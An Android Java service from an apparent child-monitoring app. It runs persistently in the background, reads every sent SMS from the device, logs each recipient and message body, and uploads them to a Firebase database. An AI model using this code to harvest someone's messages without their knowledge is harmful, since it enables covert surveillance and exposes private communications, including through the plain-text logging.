package com.example.childproject;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.Toast;

import com.example.childproject.Common.Common;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.HashMap;

import es.dmoral.toasty.Toasty;

public class MessageService extends Service {
    ArrayList<String> smsMessagesList = new ArrayList<String>();
    ArrayList<String> messagestore = new ArrayList <String>(  );
    HashMap<String, String> nameNumberMap = new HashMap <String, String>();
    ArrayAdapter arrayAdapter;
    DatabaseReference users;
    FirebaseDatabase db;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        arrayAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, smsMessagesList);
        db = FirebaseDatabase.getInstance();
        refreshSmsInbox();
        return  START_STICKY;
    }

    public void refreshSmsInbox() {

        ContentResolver contentResolver = getContentResolver();
        Cursor smsInboxCursor = contentResolver.query( Uri.parse("content://sms/sent"), null, null, null, null);

        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        //  String name = smsInboxCursor.getString( 0 );
        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
        arrayAdapter.clear();
        String str;
       /* while (smsInboxCursor.moveToNext()) {
            str = "SMS Sent to : " +smsInboxCursor.getString( indexAddress )+"  "+
                    smsInboxCursor.getString(indexBody) ;
            Log.e( "str",str );
            nameNumberMap.put( "Name", smsInboxCursor.getString( indexAddress ) );
            nameNumberMap.put( "Message", smsInboxCursor.getString(indexBody) );
            messagestore.add( str );
            users = db.getReference( Common.Child_information_tb1 );

            users.child( FirebaseAuth.getInstance().getCurrentUser().getUid() )
                    .child( "Message" )
                    .push()
                    .setValue( nameNumberMap )
                    .addOnSuccessListener( new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void aVoid) {
                        }
                    } )
                    .addOnFailureListener( new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Toasty.error( MessageService.this, "Failed ! " + e.getMessage(), Toast.LENGTH_LONG, true ).show();

                        }
                    } );

            arrayAdapter.add(str);
        }*/
        do {

            str = "SMS Sent to : " +smsInboxCursor.getString( indexAddress )+"  "+
                    smsInboxCursor.getString(indexBody) ;
            Log.e( "str",str );
            nameNumberMap.put( "Name", smsInboxCursor.getString( indexAddress ) );
            nameNumberMap.put( "Message", smsInboxCursor.getString(indexBody) );
            messagestore.add( str );
            users = db.getReference( Common.Child_information_tb1 );

            users.child( FirebaseAuth.getInstance().getCurrentUser().getUid() )
                    .child( "Message" )
                    .push()
                    .setValue( nameNumberMap )
                    .addOnSuccessListener( new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void aVoid) {
                        }
                    } )
                    .addOnFailureListener( new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Toasty.error( MessageService.this, "Failed ! " + e.getMessage(), Toast.LENGTH_LONG, true ).show();

                        }
                    } );

            arrayAdapter.add(str);

        } while (smsInboxCursor.moveToNext());



    }
}
